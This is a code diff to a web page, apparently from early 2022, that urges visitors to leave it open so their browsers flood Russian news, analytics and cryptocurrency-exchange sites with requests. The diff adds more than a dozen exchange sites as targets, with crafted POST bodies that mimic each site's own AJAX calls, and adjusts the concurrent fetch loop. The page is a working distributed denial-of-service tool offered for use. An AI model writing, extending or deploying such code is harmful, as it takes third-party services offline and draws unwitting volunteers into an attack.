@@ -14,7 +14,7 @@
               better to shut them down and let people switch to trustful news.</p>
           <p>Please, just open this page and let it be open on your devices. It will flood the
               Russian propaganda websites and pose a huge load on their infrastructure.</p>
-          <p>Your browser will be slow. It's ok, don't worry and keep it run.</p>
+          <p>Your browser will be slow. It's ok, don't worry and keep it running.</p>
           <p>A small contribution from each of us will save Ukraine 🙏</p>
         </td>
         <td width="30%">
@@ -62,6 +62,7 @@
 
   const makeid = (length) => makeAnyID(length, chars1, chars1Length);
   const makeidHexa = (length) => makeAnyID(length, chars2, chars2Length);
+  const now = () => Math.floor(Date.now() / 1000);
 
   var targets = {
     // GET:
@@ -69,6 +70,23 @@
     'https://mc.yandex.ru/watch/344709/1?wmode=7&page-url=https%3A%2F%2Fwww.gazeta.ru%2Fpolitics%2Fnews%2F2022%2F02%2F26%2F17350597.shtml%3Fupdated&page-ref=https%3A%2F%2Fwww.gazeta.ru%2Fpolitics%2Fnews%2F2022%2F02%2F26%2F17350597.shtml&nohit=1&charset=utf-8&cnt-class=1&browser-info=pv%3A1%3Agdpr%3A14%3Avf%3A7oivoctnsftpvxmegov%3Afu%3A0%3Aen%3Autf-8%3Ala%3Aen-US%3Av%3A760%3Acn%3A3%3Adp%3A1%3Als%3A1040796888110%3Ahid%3A905254112%3Az%3A420%3Ai%3A20220227104955%3Aet%3A1645933795%3Ac%3A1%3Arn%3A915453336%3Au%3A1645933161222770635%3Aw%3A1688x542%3As%3A3440x1440x24%3Ask%3A1%3Acpf%3A1%3Aeu%3A0%3Ans%3A1645933789441%3Awv%3A2%3Aco%3A0%3Aadb%3A2%3App%3A3629563401%3Arqnl%3A1%3Ast%3A1645933795%3At%3A%D0%A0%D0%BE%D1%81%D1%81%D0%B8%D1%8F%20%D0%BF%D0%BE%D0%B4%D1%82%D0%B2%D0%B5%D1%80%D0%B4%D0%B8%D0%BB%D0%B0%20%D0%A2%D1%83%D1%80%D1%86%D0%B8%D0%B8%20%D0%B3%D0%BE%D1%82%D0%BE%D0%B2%D0%BD%D0%BE%D1%81%D1%82%D1%8C%20%D0%BA%C2%A0%D1%83%D1%80%D0%B5%D0%B3%D1%83%D0%BB%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D1%8E%20%D0%BA%D1%80%D0%B8%D0%B7%D0%B8%D1%81%D0%B0%20%D0%BD%D0%B0%C2%A0%D0%A3%D0%BA%D1%80%D0%B0%D0%B8%D0%BD%D0%B5%20-%20%D0%93%D0%B0%D0%B7%D0%B5%D1%82%D0%B0.Ru%20%7C%20%D0%9D%D0%BE%D0%B2%D0%BE%D1%81%D1%82%D0%B8&t=gdpr%2814%29mc%28p-7%29lt%28128900%29aw%281%29ti%282%29': { number_of_requests: 0, number_of_errored_responses: 0 },
     'https://russian.rt.com/widget/news-of-hour/json': { number_of_requests: 0, number_of_errored_responses: 0 },
     'https://yandex.ru/set/s/rsya-tag-users/data?referrer=https%3A%2F%2Frussian.rt.com%2F': { number_of_requests: 0, number_of_errored_responses: 0 },
+    'https://cleanbtc.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+    'https://bonkypay.com': { number_of_requests: 0, number_of_errored_responses: 0 },
+    'https://mine.exchange': { number_of_requests: 0, number_of_errored_responses: 0 },
+    'https://betatransfer.org': { number_of_requests: 0, number_of_errored_responses: 0 },
+    'https://ramon.money': { number_of_requests: 0, number_of_errored_responses: 0 },
+    'https://bitokk.biz': { number_of_requests: 0, number_of_errored_responses: 0 },
+    'https://api.netex24.net/exchangeDirection/getAll': { number_of_requests: 0, number_of_errored_responses: 0 },
+    'https://cashbank.pro': { number_of_requests: 0, number_of_errored_responses: 0 },
+    'https://flashobmen.com': { number_of_requests: 0, number_of_errored_responses: 0 },
+    'https://ychanger.net': { number_of_requests: 0, number_of_errored_responses: 0 },
+    'https://multichange.net': { number_of_requests: 0, number_of_errored_responses: 0 },
+    'https://24paybank.net': { number_of_requests: 0, number_of_errored_responses: 0 },
+    'https://royal.cash': { number_of_requests: 0, number_of_errored_responses: 0 },
+    'https://prostocash.com': { number_of_requests: 0, number_of_errored_responses: 0 },
+    'https://baksman.org': { number_of_requests: 0, number_of_errored_responses: 0 },
+    'https://kupibit.me': { number_of_requests: 0, number_of_errored_responses: 0 },
+
     // POST:
     'https://smi2.ru/newdata/jsapi?action=news': {
         process: function () {
@@ -122,9 +140,105 @@
         },
         number_of_requests: 0, number_of_errored_responses: 0
     },
-    '': { number_of_requests: 0, number_of_errored_responses: 0 },
-    '': { number_of_requests: 0, number_of_errored_responses: 0 },
-    '': { number_of_requests: 0, number_of_errored_responses: 0 },
+
+    'https://24paybank.net/changes/': {
+        process: function () {
+            return {
+                method: 'POST',
+                headers: {
+                   'content-type': 'application/x-www-form-urlencoded',
+                   'accept': 'text/plain, */*; q=0.01',
+                },
+                body: 'action=getChanges&currpage=https%3A%2F%2F24paybank.net%2F&data%5Bcourse_init%5D=true&in_background=true&queryID=1646063253077&callback=%3A%3A16460631399040_22&query_version=1.1&url=%2Fchanges%2F'
+            }
+        },
+        number_of_requests: 0, number_of_errored_responses: 0
+    },
+
+    'https://cleanbtc.ru/ajax-globalajax_wp_check.html?meth=post&yid=f76d23edaa5a&lang=%D0%A0%D1%83%D1%81%D1%81%D0%BA%D0%B8%D0%B9': {
+        process: function () {
+            return {
+                method: 'POST',
+                headers: {
+                   'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                   'accept': 'application/json, text/javascript, */*; q=0.01',
+                },
+                body: `link=%2F&ltime=${now()}`
+            }
+        },
+        number_of_requests: 0, number_of_errored_responses: 0
+    },
+
+    'https://ychanger.net/changes/': {
+        process: function () {
+            return {
+                method: 'POST',
+                headers: {
+                   'content-type': 'application/x-www-form-urlencoded',
+                   'accept': 'text/plain, */*; q=0.01',
+                },
+                body: `action=getChanges&currpage=https%3A%2F%2Fychanger.net%2F&data%5Bcourse_init%5D=true&in_background=true&vri=16460642933770&initial=1&queryID=${now()}&callback=%3A%3A16460642933770_1&query_version=1.1&url=%2Fchanges%2F`
+            }
+        },
+        number_of_requests: 0, number_of_errored_responses: 0
+    },
+
+    'https://multichange.net/changes/': {
+        process: function () {
+            return {
+                method: 'POST',
+                headers: {
+                   'content-type': 'application/x-www-form-urlencoded',
+                   'accept': 'text/plain, */*; q=0.01',
+                },
+                body: `action=getChanges&currpage=https%3A%2F%2Fmultichange.net%2F&data%5Bget_course%5D%5Bc1%5D=9&data%5Bget_course%5D%5Bc2%5D=12&data%5Bcourse_init%5D=true&in_background=true&vri=16460643957100&xid=16460643942067&initial=1&queryID=${now()}&callback=%3A%3A16460643957100_1&query_version=1.1&url=%2Fchanges%2F`
+            }
+        },
+        number_of_requests: 0, number_of_errored_responses: 0
+    },
+
+    'https://royal.cash/changes/': {
+        process: function () {
+            return {
+                method: 'POST',
+                headers: {
+                   'content-type': 'application/x-www-form-urlencoded',
+                   'accept': 'text/plain, */*; q=0.01',
+                },
+                body: `action=getChanges&currpage=https%3A%2F%2Froyal.cash%2F&data%5Bcourse_init%5D=true&in_background=true&vri=16460645239480&xid=16460645230584&initial=1&queryID=${now()}&callback=%3A%3A16460645239480_1&query_version=1.1&url=%2Fchanges%2F`
+            }
+        },
+        number_of_requests: 0, number_of_errored_responses: 0
+    },
+
+    'https://prostocash.com/changes/': {
+        process: function () {
+            return {
+                method: 'POST',
+                headers: {
+                   'content-type': 'application/x-www-form-urlencoded',
+                   'accept': 'text/plain, */*; q=0.01',
+                },
+                body: `action=getChanges&currpage=https%3A%2F%2Fprostocash.com%2F&data%5Bclient_dump%5D=d0ad0b7ed4a85e50c71a2d69f90a24c2%3B3440%2C1440&in_background=true&sri=16460646124370&queryID=${now()}&callback=%3A%3A16460646124370_4&query_version=1.1&url=%2Fchanges%2F`
+            }
+        },
+        number_of_requests: 0, number_of_errored_responses: 0
+    },
+
+    'https://baksman.org/changes/': {
+        process: function () {
+            return {
+                method: 'POST',
+                headers: {
+                   'content-type': 'application/x-www-form-urlencoded',
+                   'accept': 'text/plain, */*; q=0.01',
+                },
+                body: `action=getChanges&currpage=https%3A%2F%2Fbaksman.org%2F&data%5Bcourse_init%5D=true&in_background=true&vri=16460646909840&initial=1&queryID=${now()}&callback=%3A%3A16460646909840_1&query_version=1.1&url=%2Fchanges%2F`
+            }
+        },
+        number_of_requests: 0, number_of_errored_responses: 0
+    },
+
   }
 
   const trunc = (str, num) => {
@@ -176,9 +290,9 @@
       if (queue.length > CONCURRENCY_LIMIT) {
         await queue.shift()
       }
-      rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000)
+
       queue.push(
-        fetchWithTimeout(target+rand, { timeout: 2000 })
+        fetchWithTimeout(target, { timeout: 2000 })
           .catch((error) => {
             if (error.code === 20 /* ABORT */) {
               return;
